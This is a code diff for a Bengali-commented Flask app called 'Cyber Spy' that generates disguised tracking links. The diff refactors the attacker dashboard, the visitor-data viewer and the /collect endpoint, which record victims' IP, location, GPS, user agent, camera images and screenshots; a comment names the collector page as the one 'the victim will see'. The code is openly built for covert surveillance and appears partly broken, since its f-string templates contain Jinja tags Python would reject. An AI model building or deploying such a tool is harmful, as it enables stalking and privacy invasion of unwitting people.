@@ -9,15 +9,23 @@ import uuid
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
+# ===== MongoDB সংযোগ =====
 MONGO_URI = os.environ.get('MONGO_URI')
 if not MONGO_URI:
-    raise Exception("MONGO_URI environment variable not set!")
+    raise Exception("MONGO_URI environment variable not set! Please add it in Render.")
 
-client = MongoClient(MONGO_URI)
-db = client['spy_db']
-users_col = db['users']
+try:
+    client = MongoClient(MONGO_URI)
+    db = client['spy_db']
+    users_col = db['users']
+    # টেস্ট কানেকশন
+    client.admin.command('ping')
+    print("✅ MongoDB connected successfully!")
+except Exception as e:
+    print(f"❌ MongoDB connection error: {e}")
+    raise
 
-# ===== মোবাইল-ফ্রেন্ডলি CSS + বড় টাচ এরিয়া =====
+# ===== বেস CSS (মোবাইল-ফ্রেন্ডলি) =====
 BASE_CSS = """
 <style>
     *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
@@ -29,25 +37,28 @@ BASE_CSS = """
     button{background:#ff004422;border-color:#ff0044;cursor:pointer;font-weight:bold;transition:0.2s}
     button:hover{background:#ff004466}
     a{color:#00ffcc;display:inline-block;margin-top:10px;font-size:1rem}
-    .error{color:#ff8866;margin-top:10px}
+    .error{color:#ff8866;margin-top:10px;padding:10px;background:#ff004422;border-radius:8px}
     .container{max-width:1200px;margin:auto;padding:15px}
     .card{background:#1a2332;padding:18px;border-radius:15px;margin:15px 0}
     .card input,.card button{padding:16px}
     table{width:100%;border-collapse:collapse;font-size:0.9rem}
     th,td{border:1px solid #334466;padding:10px;text-align:left;color:#c0d4ff;word-break:break-word}
-    .del-btn{padding:8px 14px;background:#ff004422;border:1px solid #ff0044;border-radius:8px;cursor:pointer}
-    .logout{float:right;background:#334466;padding:10px 18px;border-radius:10px;color:#c0d4ff}
+    .del-btn{padding:8px 14px;background:#ff004422;border:1px solid #ff0044;border-radius:8px;cursor:pointer;color:#ffccbb;text-decoration:none}
+    .logout{float:right;background:#334466;padding:10px 18px;border-radius:10px;color:#c0d4ff;text-decoration:none}
+    .brand{text-align:center;color:#ff8866;font-size:0.9rem;margin:10px 0}
+    img{max-width:80px;height:auto;border-radius:6px}
     @media(max-width:600px){
         .box{padding:20px 15px}
         h2{font-size:1.5rem}
         input,button{padding:18px;font-size:1.1rem}
-        table{font-size:0.8rem}
+        table{font-size:0.75rem}
         th,td{padding:6px}
         .container{padding:10px}
     }
 </style>
 """
 
+# ===== লগইন পেজ =====
 LOGIN_HTML = f"""
 <!DOCTYPE html>
 <html>
@@ -62,12 +73,15 @@ LOGIN_HTML = f"""
         <button type="submit">লগইন</button>
     </form>
     <a href="/register">নতুন ইউজার?</a>
-    {% if error %}<p class="error">{{ error }}</p>{% endif %}
+    {% if error is defined and error %}
+        <p class="error">{{ error }}</p>
+    {% endif %}
 </div>
 </body>
 </html>
 """
 
+# ===== রেজিস্টার পেজ =====
 REGISTER_HTML = f"""
 <!DOCTYPE html>
 <html>
@@ -82,12 +96,15 @@ REGISTER_HTML = f"""
         <button type="submit">রেজিস্টার</button>
     </form>
     <a href="/login">ইতিমধ্যে আছে?</a>
-    {% if error %}<p class="error">{{ error }}</p>{% endif %}
+    {% if error is defined and error %}
+        <p class="error">{{ error }}</p>
+    {% endif %}
 </div>
 </body>
 </html>
 """
 
+# ===== ড্যাশবোর্ড =====
 DASHBOARD_HTML = f"""
 <!DOCTYPE html>
 <html>
@@ -95,28 +112,28 @@ DASHBOARD_HTML = f"""
 <body>
 <div class="container">
     <h1 style="text-align:center;color:#ff0044;">🕵️ Cyber Spy</h1>
-    <div style="text-align:center;color:#ff8866;margin-bottom:15px;">Developer: Arif</div>
-    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;">
+    <div class="brand">Developer: Arif</div>
+    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;margin-bottom:15px;">
         <span style="color:#6688aa;">স্বাগতম, {{ user.username }}</span>
         <a href="/logout" class="logout">🚪 লগআউট</a>
     </div>
     <div class="card">
         <h3>📎 নতুন লিংক তৈরি</h3>
         <form method="POST" action="/create_link">
-            <input type="text" name="link_name" placeholder="লিংকের নাম" required>
+            <input type="text" name="link_name" placeholder="লিংকের নাম (যেমন: ফেসবুক টুল)" required>
             <button type="submit">🔗 জেনারেট</button>
         </form>
     </div>
     <div class="card">
-        <h3>📌 আপনার লিংক</h3>
+        <h3>📌 আপনার লিংকসমূহ</h3>
         {% for link in user.links %}
         <div style="background:#0d1520;padding:15px;border-radius:12px;margin:10px 0;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;">
-            <span>{{ link.name }}: <a href="{{ link.url }}" target="_blank" style="color:#00ffcc;">{{ link.url }}</a></span>
+            <span><strong>{{ link.name }}</strong><br><a href="{{ link.url }}" target="_blank" style="color:#00ffcc;word-break:break-all;">{{ link.url }}</a></span>
             <span>👁️ {{ link.visits|length }}</span>
             <a href="/view_link/{{ link.id }}" style="color:#ff0044;">📊 দেখুন</a>
         </div>
         {% else %}
-        <p style="color:#6688aa;">কোনো লিংক নেই</p>
+        <p style="color:#6688aa;">কোনো লিংক তৈরি করেননি।</p>
         {% endfor %}
     </div>
 </div>
@@ -124,13 +141,14 @@ DASHBOARD_HTML = f"""
 </html>
 """
 
+# ===== ভিজিটর ডেটা দেখার পেজ =====
 VIEW_LINK_HTML = f"""
 <!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ভিজিটর ডেটা</title>{BASE_CSS}</head>
 <body>
 <div class="container">
-    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:10px;">⬅️ ফিরুন</a>
+    <a href="/dashboard" style="color:#6688aa;display:inline-block;margin-bottom:10px;">⬅️ ড্যাশবোর্ডে ফিরুন</a>
     <h1 style="text-align:center;color:#ff0044;">📊 {{ link.name }}</h1>
     <p style="color:#6688aa;">মোট ভিজিট: {{ link.visits|length }}</p>
     <div style="overflow-x:auto;">
@@ -143,8 +161,8 @@ VIEW_LINK_HTML = f"""
             <td>{{ v.city }}, {{ v.country }}</td>
             <td>{{ v.gps or 'নেই' }}</td>
             <td>{{ v.user_agent[:25] }}..</td>
-            <td><img src="{{ v.camera or '' }}" style="max-width:80px;height:auto;" /></td>
-            <td><img src="{{ v.screenshot or '' }}" style="max-width:80px;height:auto;" /></td>
+            <td>{% if v.camera %}<img src="{{ v.camera }}" />{% else %}নেই{% endif %}</td>
+            <td>{% if v.screenshot %}<img src="{{ v.screenshot }}" />{% else %}নেই{% endif %}</td>
             <td>{{ v.time }}</td>
             <td><a href="/delete_visit/{{ link.id }}/{{ loop.index0 }}" class="del-btn">🗑️</a></td>
         </tr>
@@ -156,6 +174,7 @@ VIEW_LINK_HTML = f"""
 </html>
 """
 
+# ===== ডেটা কালেক্টর পেজ (ভিকটিম দেখবে) =====
 COLLECTOR_HTML = """
 <!DOCTYPE html>
 <html>
@@ -233,44 +252,56 @@ p{font-size:1.2rem;color:#6688aa}
 </html>
 """
 
-# ===== হেল্পার =====
+# ===== হেল্পার ফাংশন =====
 def get_user(username):
     return users_col.find_one({'username': username})
 
 def create_user(username, password):
     hashed = hashlib.sha256(password.encode()).hexdigest()
-    user = {'username': username, 'password': hashed, 'links': []}
+    user = {
+        'username': username,
+        'password': hashed,
+        'links': []
+    }
     users_col.insert_one(user)
     return user
 
+# ===== রাউট =====
 @app.route('/')
 def home():
     return redirect(url_for('login'))
 
-@app.route('/login', methods=['GET','POST'])
+@app.route('/login', methods=['GET', 'POST'])
 def login():
+    error = None
     if request.method == 'POST':
-        username = request.form['username'].strip()
-        password = request.form['password'].strip()
-        user = get_user(username)
-        if user and user['password'] == hashlib.sha256(password.encode()).hexdigest():
-            session['user'] = username
-            return redirect(url_for('dashboard'))
-        return render_template_string(LOGIN_HTML, error='ভুল ক্রেডেনশিয়াল')
-    return render_template_string(LOGIN_HTML, error=None)
-
-@app.route('/register', methods=['GET','POST'])
-def register():
-    if request.method == 'POST':
-        username = request.form['username'].strip()
-        password = request.form['password'].strip()
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
         if not username or not password:
-            return render_template_string(REGISTER_HTML, error='সব ফিল্ড পূরণ করুন')
-        if get_user(username):
-            return render_template_string(REGISTER_HTML, error='ইউজারনেম নেওয়া হয়েছে')
-        create_user(username, password)
-        return redirect(url_for('login'))
-    return render_template_string(REGISTER_HTML, error=None)
+            error = 'ইউজারনেম ও পাসওয়ার্ড দিন'
+        else:
+            user = get_user(username)
+            if user and user['password'] == hashlib.sha256(password.encode()).hexdigest():
+                session['user'] = username
+                return redirect(url_for('dashboard'))
+            else:
+                error = 'ভুল ক্রেডেনশিয়াল'
+    return render_template_string(LOGIN_HTML, error=error)
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    error = None
+    if request.method == 'POST':
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '').strip()
+        if not username or not password:
+            error = 'সব ফিল্ড পূরণ করুন'
+        elif get_user(username):
+            error = 'ইউজারনেম নেওয়া হয়েছে'
+        else:
+            create_user(username, password)
+            return redirect(url_for('login'))
+    return render_template_string(REGISTER_HTML, error=error)
 
 @app.route('/dashboard')
 def dashboard():
@@ -286,7 +317,7 @@ def dashboard():
 def create_link():
     if 'user' not in session:
         return redirect(url_for('login'))
-    link_name = request.form['link_name'].strip()
+    link_name = request.form.get('link_name', '').strip()
     if not link_name:
         return redirect(url_for('dashboard'))
     link_id = str(uuid.uuid4())[:8]
@@ -307,14 +338,15 @@ def collector_page(link_id):
         city = loc.get('city', 'অজানা')
         country = loc.get('country', 'অজানা')
     except:
-        city = 'অজানা'; country = 'অজানা'
-    return render_template_string(COLLECTOR_HTML, ip=ip, city=city, country=country, link_id=link_id)
+        city = 'অজানা'
+        country = 'অজানা'
+    return render_template_string(COLLECTOR_HTML, ip=ip, link_id=link_id)
 
 @app.route('/collect/<link_id>', methods=['POST'])
 def collect_data(link_id):
     data = request.get_json()
     if not data:
-        return 'ERROR', 400
+        return 'ERROR: No data', 400
     data['time'] = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     ip = data.get('ip')
     if ip:
@@ -334,7 +366,7 @@ def collect_data(link_id):
     )
     if result.matched_count:
         return 'OK', 200
-    return 'ERROR', 404
+    return 'ERROR: Link not found', 404
 
 @app.route('/view_link/<link_id>')
 def view_link(link_id):
@@ -344,7 +376,11 @@ def view_link(link_id):
     if not user:
         session.clear()
         return redirect(url_for('login'))
-    link = next((l for l in user['links'] if l['id'] == link_id), None)
+    link = None
+    for l in user['links']:
+        if l['id'] == link_id:
+            link = l
+            break
     if not link:
         return 'লিংক পাওয়া যায়নি', 404
     return render_template_string(VIEW_LINK_HTML, link=link)
